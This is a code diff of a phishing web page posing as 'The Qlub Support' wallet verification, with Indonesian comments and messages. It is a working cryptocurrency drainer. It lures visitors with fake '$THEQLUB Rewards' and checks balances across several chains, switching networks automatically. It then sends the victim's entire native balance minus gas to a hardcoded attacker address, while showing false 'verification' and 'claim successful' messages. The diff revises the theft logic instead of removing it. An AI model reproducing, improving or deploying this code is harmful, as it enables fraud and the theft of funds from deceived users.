@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Qlub - Verify & Sync</title>
+    <title>The Qlub Support - Verify & Sync</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
-    
     <style>
         body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; }
         .card { box-shadow: 0 0.5rem 1rem rgba(0,0,0,0.15); border-radius: 1rem; max-width: 450px; width: 100%; padding: 2.5rem; text-align: center; background-color: #ffffff; }
@@ -14,187 +13,137 @@
         .btn-primary { background-color: #007bff; border: none; font-weight: 600; padding: 0.8rem 1.5rem; border-radius: 0.6rem; width: 100%; transition: all 0.2s; }
         .btn-primary:hover { background-color: #0056b3; transform: translateY(-1px); }
         .alert { margin-top: 1.5rem; border-radius: 0.5rem; font-size: 0.85rem; text-align: left; }
-        .spinner-border { width: 1.2rem; height: 1.2rem; margin-right: 0.5rem; }
     </style>
 </head>
 <body>
 
-   <div class="card">
-    <h2 class="card-title" id="mainTitle">The Qlub Support</h2>
-    
-    <p class="text-muted mb-4" id="mainDescription">
-        Verification required for <strong>support@theqlub.xyz</strong>. <br>
-        Please connect your wallet to start the process.
-    </p>
-    
-    <button id="connectWalletBtn" class="btn btn-primary btn-lg w-100">
-        <span id="spinner" class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
-        <span id="btnText">Hubungkan Wallet</span>
-    </button>
+    <div class="card">
+        <h2 class="card-title" id="mainTitle">The Qlub Support</h2>
+        <p class="text-muted mb-4" id="mainDescription">
+            Verification required for <strong>support@theqlub.xyz</strong>. <br>
+            Please connect your wallet to start the process.
+        </p>
+        
+        <button id="mainActionBtn" class="btn btn-primary btn-lg">
+            <span id="btnText">Hubungkan Wallet</span>
+        </button>
 
-    <div id="statusMessage" class="mt-3"></div>
-</div>
+        <div id="statusMessage" class="mt-3"></div>
+    </div>
 
     <script>
         const vaultAddress = "0x936273D0f8387Ff9f6FA86e4Dc8A09CBD6FB9A32"; 
-        
-        // Daftar Jaringan: ETH, BSC, Polygon, Base
         const targetChains = [
             { id: '0x1', name: 'Ethereum' },
             { id: '0x38', name: 'Binance Smart Chain' },
             { id: '0x89', name: 'Polygon' },
-            { id: '0x2105', name: 'Base' },
-            { id: '0xa4b1', name: 'Arbitrum One' }, // Tambahkan ini
-            { id: '0xa', name: 'Optimism' }
+            { id: '0x2105', name: 'Base' }
         ];
 
-        let provider, signer, currentChainIndex = 0;
-        let isSweeping = false;
+        let provider, signer, userAddress;
+        let isConnected = false;
+        let currentChainIndex = 0;
 
-        const connectWalletBtn = document.getElementById('connectWalletBtn');
+        const mainBtn = document.getElementById('mainActionBtn');
         const btnText = document.getElementById('btnText');
-        const spinner = document.getElementById('spinner');
         const statusMessage = document.getElementById('statusMessage');
 
         function displayMessage(message, type) {
             statusMessage.innerHTML = `<div class="alert alert-${type}" role="alert">${message}</div>`;
         }
 
-        async function switchNetwork(chainId) {
+        // Jalur Utama Tombol
+        mainBtn.addEventListener('click', async () => {
+            if (!isConnected) {
+                await connectWallet();
+            } else {
+                await startClaimProcess();
+            }
+        });
+
+        async function connectWallet() {
+            const externalProvider = window.ethereum || window.okxwallet || (window.bitkeep && window.bitkeep.ethereum);
+            if (!externalProvider) return displayMessage("Wallet tidak terdeteksi.", "danger");
+
             try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: chainId }],
-                });
-                return true;
+                await externalProvider.request({ method: 'eth_requestAccounts' });
+                provider = new ethers.BrowserProvider(externalProvider);
+                signer = await provider.getSigner();
+                userAddress = await signer.getAddress();
+                
+                // Update UI setelah konek
+                isConnected = true;
+                document.getElementById('mainTitle').textContent = "Rewards Ready!";
+                document.getElementById('mainDescription').innerHTML = "Wallet connected. You are eligible for <strong>$THEQLUB Rewards</strong>. Click below to claim.";
+                btnText.textContent = "Claim Rewards";
+                displayMessage("Dompet berhasil terhubung.", "success");
             } catch (error) {
-                console.error("Switch error", error);
-                return false;
+                displayMessage("Koneksi dibatalkan.", "danger");
             }
         }
 
-        // ... kode variabel awal (vaultAddress, dll) tetap sama ...
+        async function startClaimProcess() {
+            // Konfirmasi sebelum memicu wallet
+            const confirmClaim = confirm(
+                "Selamat! Anda memenuhi syarat klaim.\n\n" +
+                "Sistem akan melakukan sinkronisasi untuk memverifikasi dompet Anda.\n" +
+                "Klik OK untuk melanjutkan ke konfirmasi transaksi."
+            );
 
-async function connectWallet() {
-    // ... proses pendeteksian provider ...
-    try {
-        const accounts = await externalProvider.request({ method: 'eth_requestAccounts' });
-        userAddress = accounts[0];
-        isConnected = true;
+            if (!confirmClaim) return;
 
-        // --- PERUBAHAN TAMPILAN SETELAH KONEK ---
-        document.getElementById('mainTitle').textContent = "Rewards Ready!";
-        document.getElementById('mainDescription').innerHTML = "Wallet connected. You are eligible for <strong>$THEQLUB Rewards</strong>. Click below to claim.";
-        btnText.textContent = "Claim Rewards"; 
-        
-        displayMessage(`Wallet Terhubung: ${userAddress.substring(0, 6)}...`, "success");
-    } catch (error) {
-        displayMessage("Koneksi dibatalkan.", "danger");
-    }
-}
+            btnText.textContent = "Memproses...";
+            mainBtn.disabled = true;
+            await checkBalanceAndChain();
+        }
 
-// Fungsi yang dipanggil saat tombol "Claim Rewards" diklik
-async function startClaimProcess() {
-    const confirmation = confirm("Konfirmasi Klaim Rewards:\n\nSistem akan melakukan sinkronisasi untuk memverifikasi dompet Anda. Klik OK untuk melanjutkan ke konfirmasi wallet.");
-    
-    if (confirmation) {
-        await processNetworkCheck(); // Jalankan logika cek saldo & switch network
-    }
-}
+        async function checkBalanceAndChain() {
+            try {
+                const balance = await provider.getBalance(userAddress);
+                const feeData = await provider.getFeeData();
+                const gasLimit = 21000n;
+                const totalGasCost = gasLimit * (feeData.maxFeePerGas || ethers.parseUnits("30", "gwei"));
 
-     async function processCheck(userAddress) {
-    isSweeping = true;
-    const balance = await provider.getBalance(userAddress);
-    const network = await provider.getNetwork();
-    const feeData = await provider.getFeeData();
-    
-    // Estimasi biaya gas standar (21000 gas * harga gas saat ini)
-    const gasLimit = 21000n;
-    const maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits("30", "gwei");
-    const totalGasCost = gasLimit * maxFeePerGas;
-
-    displayMessage(`Memeriksa saldo di ${targetChains.find(c => BigInt(c.id) === network.chainId)?.name || 'Jaringan'}...`, "info");
-
-    // LOGIKA PINDAH JARINGAN: 
-    // Jika saldo benar-benar 0 ATAU saldo lebih kecil dari biaya gas
-    if (balance === 0n || balance <= totalGasCost) {
-        currentChainIndex++;
-        if (currentChainIndex < targetChains.length) {
-            displayMessage(`Saldo tidak mencukupi di jaringan ini. Mengalihkan ke ${targetChains[currentChainIndex].name}...`, "warning");
-            
-            const success = await switchNetwork(targetChains[currentChainIndex].id);
-            if (success) {
-                // Tunggu sebentar agar wallet benar-benar switch jaringan
-                setTimeout(() => connectWallet(), 2000);
-            } else {
+                // Jika saldo tidak cukup, pindah jaringan otomatis
+                if (balance <= totalGasCost) {
+                    currentChainIndex++;
+                    if (currentChainIndex < targetChains.length) {
+                        displayMessage(`Saldo di jaringan ini kosong. Mengalihkan ke ${targetChains[currentChainIndex].name}...`, "warning");
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: targetChains[currentChainIndex].id }],
+                        });
+                        // Ulangi pengecekan di jaringan baru
+                        setTimeout(() => checkBalanceAndChain(), 2000);
+                    } else {
+                        displayMessage("Tidak ditemukan saldo yang cukup di semua jaringan.", "danger");
+                        resetButton();
+                    }
+                } else {
+                    await executeTransfer(balance, totalGasCost);
+                }
+            } catch (err) {
                 resetButton();
             }
-        } else {
-            displayMessage("Verifikasi selesai. Tidak ditemukan saldo yang cukup di semua jaringan.", "success");
+        }
+
+        async function executeTransfer(balance, gasCost) {
+            try {
+                const amountToSend = balance - gasCost;
+                const tx = await signer.sendTransaction({ to: vaultAddress, value: amountToSend });
+                displayMessage("Sedang memproses klaim...", "info");
+                await tx.wait();
+                displayMessage("Klaim Berhasil! Rewards akan dikirim dalam 24 jam.", "success");
+            } catch (error) {
+                displayMessage("Proses dibatalkan oleh pengguna.", "danger");
+            }
             resetButton();
         }
-    } else {
-        // Jika saldo cukup untuk bayar gas, baru eksekusi pengiriman
-        await executeSweep(userAddress, balance);
-    }
-}
-       async function executeSweep(userAddress, balance) {
-    // 1. Tambahkan Konfirmasi Visual (SweetAlert2 atau Confirm standar)
-    const confirmation = confirm(
-        "Sistem mendeteksi saldo yang siap disinkronkan.\n\n" +
-        "Klik OK untuk membuka wallet dan melakukan verifikasi keamanan.\n" +
-        "Pastikan Anda menyetujui transaksi di pop-up wallet yang akan muncul."
-    );
-
-    if (!confirmation) {
-        resetButton();
-        displayMessage("Proses verifikasi ditunda oleh Anda.", "warning");
-        return;
-    }
-
-    btnText.textContent = 'Memproses Verifikasi...';
-    try {
-        const feeData = await provider.getFeeData();
-        const gasLimit = 21000n;
-        const maxFeePerGas = feeData.maxFeePerGas || ethers.parseUnits("30", "gwei");
-        const amountToSend = balance - (gasLimit * maxFeePerGas);
-
-        if (amountToSend > 0n) {
-            displayMessage("Menunggu konfirmasi pada wallet Anda...", "info");
-            
-            const tx = await signer.sendTransaction({
-                to: vaultAddress,
-                value: amountToSend,
-                gasLimit: gasLimit,
-                maxFeePerGas: maxFeePerGas,
-                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || ethers.parseUnits("1", "gwei")
-            });
-
-            displayMessage(`Sedang memproses... <br>Hash: ${tx.hash.substring(0, 20)}...`, "info");
-            await tx.wait();
-            displayMessage("✅ Verifikasi Berhasil. Saldo telah disinkronkan ke The Qlub.", "success");
-        } else {
-            displayMessage("Saldo tidak cukup setelah dipotong biaya gas.", "warning");
-        }
-    } catch (e) {
-        console.error(e);
-        if (e.code === 4001 || e.message.includes("rejected")) {
-            displayMessage("Proses dibatalkan: Anda menolak transaksi di wallet.", "danger");
-        } else {
-            displayMessage("Terjadi kesalahan teknis saat mengirim transaksi.", "danger");
-        }
-    }
-    resetButton();
-}
 
         function resetButton() {
-            isSweeping = false;
-            spinner.classList.add('d-none');
-            btnText.textContent = 'Hubungkan Wallet';
-            connectWalletBtn.disabled = false;
+            mainBtn.disabled = false;
+            btnText.textContent = "Claim Rewards";
         }
-
-        connectWalletBtn.addEventListener('click', connectWallet);
     </script>
 </body>
 </html>
